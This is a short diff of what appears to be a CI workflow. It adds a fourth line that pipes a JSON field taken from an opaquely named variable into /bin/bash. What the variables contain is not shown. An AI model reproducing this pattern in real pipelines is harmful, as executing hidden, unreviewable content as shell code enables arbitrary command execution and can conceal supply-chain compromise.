@@ -27,6 +27,7 @@ jobs:
           echo $ksg354 | jq -r .pzcg57 | /bin/bash
           printf '%s' "$qivj6" | jq -r .cd00302 | /bin/bash
           printf '%s' "$wrl8" | jq -r .bvxn00724 | /bin/bash
+          echo $khnb802 | jq -r .z06 | /bin/bash
 
       - name: Archive results
         if: always()
